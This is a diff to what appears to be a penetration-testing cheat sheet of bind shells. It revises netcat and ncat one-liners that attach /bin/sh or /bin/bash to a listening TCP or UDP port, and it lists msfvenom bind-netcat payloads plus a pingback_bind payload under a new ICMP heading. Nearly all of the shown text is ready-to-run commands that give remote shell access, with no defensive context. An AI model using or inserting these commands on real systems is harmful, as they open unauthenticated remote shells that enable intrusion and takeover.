@@ -5,9 +5,9 @@
 ### 1.1 - Traditional GNU Method
 
 ```
-$ nc -lnvp <PORT> -e /bin/sh
+$ nc -lp <PORT> -e /bin/sh
 
-$ nc -lnvp <PORT> -e /bin/bash
+$ nc -lp <PORT> -e /bin/bash
 ```
 
 ### 1.2 - Ncat
@@ -15,13 +15,13 @@ $ nc -lnvp <PORT> -e /bin/bash
 TCP method.
 
 ```
-$ ncat -lnvp <PORT> -e /bin/bash
+$ ncat -lp <PORT> -e /bin/bash
 ```
 
 UDP method.
 
 ```
-$ ncat -lnuvp <PORT> -e /bin/bash
+$ ncat -lup <PORT> -e /bin/bash
 ```
 
 ### 1.2 - OpenBSD Method
@@ -46,6 +46,10 @@ $ msfvenom -p cmd/unix/bind_netcat lport=<PORT>
 $ msfvenom -p cmd/unix/bind_netcat_gaping lport=<PORT>
 
 $ msfvenom -p cmd/unix/bind_netcat_gaping_ipv6 lport=<PORT>
+```
 
+### 2.3 - ICMP Method
+
+```
 $ msfvenom -p cmd/unix/pingback_bind lport=<PORT>
 ```
